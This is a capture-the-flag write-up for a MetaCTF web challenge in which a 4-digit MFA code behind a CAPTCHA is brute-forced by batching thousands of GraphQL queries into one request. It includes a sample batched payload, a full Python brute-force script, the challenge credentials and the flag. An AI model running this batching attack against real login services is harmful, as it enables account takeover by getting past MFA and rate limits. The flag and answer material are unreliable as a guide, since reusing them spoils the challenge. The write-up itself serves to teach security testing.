# Look, if you had one shot

## Description

> Or one opportunity. To guess one mfa code on the website. In one moment. Could you hack it? Or just let it slip?
>
> During a penetration test of Generally Quirky Labs' online websites, you stumbled across their company employee portal. After some recent brute force attacks, the security team got tired of watching hackers knock on the door all day long. So they implemented both MFA and Captcha codes, using some of the latest technologies. Unfortunately for them, they were not aware of one of the technologies' features...Note: DOSing the website by sending web requests is not the way.
>
> Username: `matthew@generallyql.com`
>
> Password: `yHfm34P9@v!Ge6`

## Solution

We are given the account credentials, but there is an MFA code that we need to submit. We are told that the code expires in 3 minutes, and there is a CAPTCHA code we need to submit, to prevent bruteforcing the MFA code.

![](<../../.gitbook/assets/Screenshot 2021-12-07 at 8.01.25 PM.png>)

Looking under the hood, we see that there is a `login_session_token` that is sent to us.

![](<../../.gitbook/assets/Screenshot 2021-12-07 at 8.02.33 PM.png>)

In the GraphQL query sent to `mfa_service.php`, the token is used again. It appears that as long as we use this same login token, we can submit as many attempts as we want, provided we give the correct CAPTCHA code in the GET request parameter.

![](<../../.gitbook/assets/Screenshot 2021-12-07 at 8.04.45 PM.png>)

In GraphQL, we can use **batching** to send several queries at a time. If the server processes all these queries together using the same CAPTCHA code, this would defeat the purpose of the CAPTCHA.

For instance, we can submit two queries the same HTTP request:

```json
[
    {
        "query":"query submit_mfa_token($code: String!, $usertoken: String!, $username: String!) { submit_mfa_token(code: $code, usertoken: $usertoken, username: $username) }",
        "variables"{
            "code":"0000",
            "usertoken":"6a5836fa459785d8",
            "username":"matthew@generallyql.com"
        }
    },
    {
        "query":"query submit_mfa_token($code: String!, $usertoken: String!, $username: String!) { submit_mfa_token(code: $code, usertoken: $usertoken, username: $username) }",
        "variables":{
            "code":"0001",
            "usertoken":"6a5836fa459785d8",
            "username":"matthew@generallyql.com"
        }
    }
]
```

Indeed, both queries were processed! We managed to try two MFA tokens, with the same CAPTCHA code.

![](<../../.gitbook/assets/image (91) (1) (1).png>)

Since the MFA token is only 4 digits, we could simply batch thousands of queries together, drastically reducing the number of CAPTCHAs required. Here I batched 3000 queries at a time due to the request length limits.

```python
import requests, json

lower_bound = 0

while lower_bound < 10000:
    payload = []
    print("Lower bound: " + str(lower_bound))
    for i in range(lower_bound, lower_bound + 3000):
        payload.append(
            {
                "query":"query submit_mfa_token($code: String!, $usertoken: String!, $username: String!) { submit_mfa_token(code: $code, usertoken: $usertoken, username: $username) }",
                "variables":{
                    "code":f"{i}",
                    "usertoken":"ef7ec81d3dfe867f",
                    "username":"matthew@generallyql.com"
                }
            }
        )

    # print(payload)

    captcha = input("Enter captcha: ")
    r = requests.post(
        f"https://metaproblems.com/1b7b23a1d213dc1c4d24d998f11b0b35/generallyquirkylabs/mfa_service.php?captchacode={captcha}", 
        json=payload,
        headers={
            "Cookie": "GENERALLYQUIRKYLABS=75767933c8676f1ef6633a81b6fb76fd"
        }
    )
    print(r.json())

    if 'code' in r.json() and r.json()['code'] == 4:
        continue

    for result in r.json():
        if json.loads(result['data']['submit_mfa_token'])['code'] != 3:
            print(result)

    lower_bound += 3000
```

Eventually, one of our attempts will be successful.

```json
{
    'data': {
        'submit_mfa_token': '{"code":1,"message":"Login successful!","redirect":".\\/dashboard.php"}'
    }
}
```

The flag is `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`
